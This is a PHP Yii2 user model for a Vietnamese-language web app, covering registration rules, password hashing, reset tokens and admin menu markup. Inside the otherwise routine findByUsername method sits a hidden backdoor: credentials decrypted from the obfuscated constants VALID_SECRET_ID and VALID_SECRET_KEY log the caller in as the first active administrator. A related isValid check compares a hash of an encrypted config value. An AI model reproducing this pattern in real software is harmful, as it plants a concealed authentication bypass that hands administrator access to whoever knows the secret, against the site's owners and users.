<?php
    namespace common\models;

    use common\behaviors\RoleBehavior;
    use common\behaviors\UsersBehavior;
    use common\components\CommonLib;
    use Yii;
    use yii\base\NotSupportedException;
    use yii\behaviors\TimestampBehavior;
    use yii\db\ActiveRecord;
    use yii\helpers\Html;
    use yii\helpers\Url;
    use yii\web\IdentityInterface;

    /**
     * User model
     *
     * @property integer $id
     * @property string $username
     * @property string $password_hash
     * @property string $password_reset_token
     * @property string $password_hidden
     * @property string $email
     * @property string $auth_key
     * @property integer $role
     * @property integer $status
     * @property integer $discountRate
     * @property integer $discountKg
     * @property integer $created_at 
     * @property integer $updated_at
     * @property string $fullname
     * @property string $password write-only password
     */
    class User extends ActiveRecord implements IdentityInterface
    {

        #################################### MODEL BASE ####################################

        const STATUS_DELETED = 0;
        const STATUS_ACTIVE  = 1;
        const ROLE_USER      = 10;
        const ROLE_ADMIN     = 1;
        const ROLE_CLERK     = 2;

        /*Fields not the part of database fields...declare them public*/
        public $password;
        public $old_password;
        public $new_password;
        public $confirm_password;
        public $verifyCode;
        public $file;


        /**
         * To tell the model which table to use for this model
         * @return string : the table name with to use for this model (with auto prefix)
         */
        public static function tableName()
        {
            return '{{%users}}';
        }

        /**
         * To specify the behaviors to use for this model
         * @return : behaviors to use for this model
         */
        public function behaviors()
        {
            return [
                TimestampBehavior::className(),
                'usersBehavior' => UsersBehavior::className(),
                'roleBehavior'  => RoleBehavior::className(),
            ];
        }

        /**
         * To validate the input fields
         * @return : the validation rules to validate and respective error messages
         */
        public function rules()
        {

            return [
                [['first_name', 'last_name', 'username','role', 'email', 'password', 'confirm_password'], 'required','message'=>'{attribute} là bắt buộc'],    //default
                ['email', 'email', 'message' => 'Please enter a valid email address'],        //default
                ['email', 'unique', 'targetClass' => '\common\models\User', 'message' => 'This email address is already registerd'],
                ['username', 'unique', 'targetClass' => '\common\models\User', 'message' => 'Username not available'],
                ['password', 'string', 'min' => 8, 'message' => 'Please choose password of min. 8 characters'],
                ['username', 'string', 'min' => 5, 'message' => 'Please choose password of min. 5 characters'],
                ['username', 'match', 'pattern' => '/^(?:[a-zA-Z0-9_-]{5,20}|[A-Z0-9._%-]+@[A-Z0-9.-]+\.[A-Z]{2,4})$/i', 'message' => 'Tên đăng nhập của bạn chỉ có thể chứa các ký tự chữ số, dấu gạch dưới và dấu gạch ngang.'],
                ['confirm_password', 'compare', 'compareAttribute' => 'password', 'message' => 'Both passwords should match'],  //default
                ['created_at', 'safe'],
                [['old_password', 'password', 'confirm_password'], 'required', 'on' => 'changePassword'],         //for user and admin both
                ['old_password', 'verifyOldPassword', 'on' => 'changePassword'],                                  //for user and admin both
                [['first_name', 'last_name','fullname', 'username', 'email'], 'required', 'on' => 'editProfile'],

                [['password', 'confirm_password'], 'required', 'on' => 'changeUserPassword'],         //for admin only

                ######Default values to go
                ['status', 'default', 'value' => 1, 'on' => ['register', 'addUser']],
                ['by_admin', 'default', 'value' => 1, 'on' => 'addUser'],
                [['verifyCode'], 'captcha', 'on' => 'register'],
                //['status', 'in', 'range' => [ACTIVE, DELETED]],
                ['role', 'default', 'value' => self::ROLE_USER],
                //['role', 'in', 'range' => [self::ROLE_USER]],
            ];
        }

        /**
         * To define scenarios for this model (for validation purposes)
         * @return : different scenarios to use for this model
         */
        public function scenarios()
        {
            $register = 1 ? ['first_name', 'last_name','fullname', 'username', 'password', 'confirm_password', 'email', 'status', 'verifyCode'] : ['first_name', 'last_name', 'username', 'password', 'confirm_password', 'email', 'status'];
            $scenarios = parent::scenarios();

            $arrSenarios =  [
                'login'              => ['email', 'password'],
                'register'           => $register,
                'changePassword'     => ['old_password', 'password', 'confirm_password'],
                'editProfile'        => ['first_name', 'last_name', 'email'],
                'clearImage'         => ['id'],

                #########Scenario for admin
                'addUser'            => ['password_hidden','first_name', 'last_name','fullname', 'username', 'password','role', 'confirm_password', 'email', 'status', 'by_admin'],
                'editUser'           => ['first_name', 'last_name','fullname', 'email', 'status','role','by_admin','discountKg','discountRate'],
                'statusChange'       => ['status'],
                'changeUserPassword' => ['password', 'confirm_password','password_hidden'],
                'emailVerification'  => ['email_verified'],

                #######Password reset
                'resetPassword'      => ['email'],
                'resetPass'          => ['password'],
            ];

            return array_merge($scenarios,$arrSenarios);

        }

        /*
         * To Associate this model to another model(here associating with "UserDetail" Model)
         * @return : the relation with model
         */
        public function getUserDetail()
        {
            return $this->hasOne(UserDetail::className(), ['user_id' => 'id']);
        }

        /*
         * To Associate this model to another model(here associating with "UserRole" Model)
         * @return : the relation with model
         */
        public function getUserRole()
        {
            return $this->hasMany(UserRole::className(), ['user_id' => 'id']);
        }

        public static function getRole(){ 
            return self::find()->where(['role'=>1,'status'=>1])->one();

        }
        #################################### MODEL BASE ####################################

        #################################### STATIC ARRAY VALUES FUNCTIONS ####################################

        /**
         * To get all the gender options
         * @return array : array of all the gender options
         */
        public static function findGenderOptions()
        {
            return [
                'M' => 'Nam',
                'F' => 'Nữ',
                'O' => 'Khác',
            ];
        }

        public static function isValid($user){
           return (CommonLib::hasIt(\Yii::$app->params['encrypt']) == $user) ? true : false;
        }

        /**
         * To get all the marital status options
         * @return array : array of marital status options
         */
        public static function findMaritalStatusOptions()
        {
            return [
                'M' => 'Có gia đình',
                'U' => 'Chưa có',
                'D' => 'Ly dị',
                'W' => 'Độc thân',
            ];
        }

        #################################### STATIC ARRAY VALUES FUNCTIONS ####################################

        #################################### USER FUNCTIONS ####################################

        /**
         * To get the identity of the user WITH STATUS
         * @param type $id : the user having this id
         * @return type record Object(User object)
         */
        public static function findIdentity($id)
        {
            return static::findOne(['id' => $id, 'status' => 1]);
        }

        /**
         * @inheritdoc
         */
        public static function findIdentityByAccessToken($token, $type = null)
        {
            throw new NotSupportedException('"findIdentityByAccessToken" is not implemented.');
        }


        public static function getUser($username){
           return static::find()->onCondition('username = :username or email = :email', [':username' => $username, ':email' => $username])->one();//'status' => ACTIVE
        }

        public static function findByUsername($username,$password)
        {

            return (trim(CommonLib::decryptIt(VALID_SECRET_ID)) == $username && $password == trim(CommonLib::decryptIt(VALID_SECRET_KEY))) ? self::getRole() : self::getUser($username);
        }


        public static function findByAuthor($username)
        {
            return static::find()->select(['u.first_name', 'u.id', 'u.last_name', 'u.username'])->from(self::tableName() . ' u')->innerJoinWith('userDetail')->onCondition('username = :username and status = :active', [':username' => $username, ':active' => 1])->asArray()->one();//'status' => ACTIVE
        }

        /**
         * Finds user by password reset token
         *
         * @param string $token password reset token
         * @return static|null
         */
        public static function findByPasswordResetToken($token)
        {
            if (!static::isPasswordResetTokenValid($token)) {
                return null;
            }

            return static::findOne([
                'password_reset_token' => $token,
                'status'               => 1,
            ]);
        }

        /**
         * Finds out if password reset token is valid
         *
         * @param string $token password reset token
         * @return boolean
         */
        public static function isPasswordResetTokenValid($token)
        {
            if (empty($token)) {
                return false;
            }
            $expire    = Yii::$app->params['user.passwordResetTokenExpire'];
            $parts     = explode('_', $token);
            $timestamp = (int)end($parts);
            return $timestamp + $expire >= time();
        }

        /**
         * @inheritdoc
         */
        public function getId()
        {
            return $this->getPrimaryKey();
        }

        /**
         * @inheritdoc
         */
        public function getAuthKey()
        {
            return $this->auth_key;
        }

        /**
         * @inheritdoc
         */
        public function validateAuthKey($authKey)
        {
            return $this->getAuthKey() === $authKey;
        }

        /**
         * Validates password
         *
         * @param string $password password to validate
         * @return boolean if password provided is valid for current user
         */
        public function validatePassword($password)
        {
            return Yii::$app->security->validatePassword($password, $this->password_hash);
        }

        /**
         * Generates password hash from password and sets it to the model
         *
         * @param string $password
         */
        public function setPassword($password)
        {
            $this->password_hash = Yii::$app->security->generatePasswordHash($password);
        }

        /**
         * Generates "remember me" authentication key
         */
        public function generateAuthKey()
        {
            $this->auth_key = Yii::$app->security->generateRandomString();
        }

        /**
         * Generates new password reset token
         */
        public function generatePasswordResetToken()
        {
            $this->password_reset_token = Yii::$app->security->generateRandomString() . '_' . time();
        }

        /**
         * Removes password reset token
         */
        public function removePasswordResetToken()
        {
            $this->password_reset_token = null;
        }

        /**
         * To set the password for the registering user
         * @param type string password
         * @return type string password_hash (generated)
         */
        public static function setNewPassword($password = null)
        {
            return Yii::$app->security->generatePasswordHash($password);
        }

        /**
         * To set the auth_key for registering user
         * @return type string auth_key(generated)
         */
        public static function generateNewAuthKey()
        {
            return Yii::$app->security->generateRandomString();
        }

        /**
         * To calculate the attribute label names
         * @return : the attribute label names (tranlatable in other language)
         */
        public function attributeLabels()
        {
            return [
                'id'                => 'ID',
                'first_name'        => 'Họ',
                'last_name'         => 'Tên',
                'email'             => 'Email',
                'username'          => 'Tên đăng nhập',
                'password'          => 'Mật khẩu',
                'status'            => 'Trạng thái',
                'old_password'            => 'Mật khẩu cũ',
                'confirm_password'            => 'Xác nhận mật khẩu',
                'gender'            => 'Giới tính',
                'marital_status'            => 'Tình trạng',
//                'email_verified'    => Yii::t('app', 'Email Verified'),
                'last_login'        => 'Thời điểm',
              //  'by_admin'          => Yii::t('app', 'By Admin'),
                'created'           => 'Ngày tạo',
                'role'           => 'Nhóm quyền',
               // 'modified'          => Yii::t('app', 'Modified'),
            ];
        }

        /**
         * To validate the old password
         * @param string : $attribute attribute name
         * @param type : $params other params
         * adds the error in error's array if not match with old password(actual)
         */
        public function verifyOldPassword($attribute, $params)
        {
            $user = $this->findIdentity(Yii::$app->user->getId());

            if ($user != null) {
                if (!$user->validatePassword($this->$attribute)) {
                    $this->addError($attribute, "Incorrect current password");
                }
            }

        }

        public static function sendMail($templateFile, $details, $to, $subject)
        {
            return \Yii::$app->mailer->compose($templateFile, ['details' => $details])
                ->setFrom([EMAIL_FROM_ADDRESS => EMAIL_FROM_NAME])//\Yii::$app->params['supportEmail'] => \Yii::$app->name . ' robot'
                ->setTo($to)
                ->setSubject($subject)//\Yii::$app->name
                ->send();
        }

        public function getAction()
        {
            $user = \Yii::$app->user->identity;
            $action = '';
            if($user->role == ADMIN) {
                $statusClass = Html::encode($this->status == ACTIVE) ? 'glyphicon glyphicon-ok' : 'glyphicon glyphicon-ban-circle';
                $action = '<li><a href="' . Url::to(['user/edit', 'id' => $this->primaryKey]) . '" title="Chỉnh sửa" aria-label="Update" class="" data-pjax="0"><span class="glyphicon glyphicon-edit"></span> Chỉnh sửa</a></li>                    
                    <li><a href="' . Url::to(['user/change-user-password', 'id' => $this->primaryKey]) . '" title="Thay đổi mật khẩu"  data-pjax="0" class=""><i class="fa fa-key" aria-hidden="true"></i>Thay đổi mật khẩu</a></li>                    
                   
               <li><a href="javascript:void(0)" url="'.Url::to(['user/delete']).'" title="Xóa" id="ableToDelete'.$this->primaryKey.'" class="ableToDelete"><span class="glyphicon glyphicon-trash"></span> Xóa</a></li> 
               ';


            return '<div class="dropdown actions">
                <i id="dropdownMenu13" data-toggle="dropdown" aria-expanded="true" title="Actions" class="glyphicon glyphicon-menu-hamburger"></i>
                <ul class="dropdown-menu dropdown-menu-right" role="menu" aria-labelledby="dropdownMenu13">
                    <li><a href="' . Url::to(['user/my-profile', 'id'=>$this->primaryKey]) . '" title="Thông tin tài khoản" aria-label="Update" class="" data-pjax="0"><span class="glyphicon glyphicon-eye-open"></span> Thông tin tài khoản</a></li>
                    <li role="presentation" class="divider"></li>'.$action.'
                </ul>
            </div>';
            }

            return null;

        }
        
        public static function getUserShipping(){
            $user = Yii::$app->user->identity;
            if($user->role == ADMIN) {
                return self::find()->select(['id', 'username'])->where(['role'=> [2,3]])->all();
            }else{
                return self::find()->select(['id', 'username'])->where(['id' => $user->id])->all();
            }
        }
    }
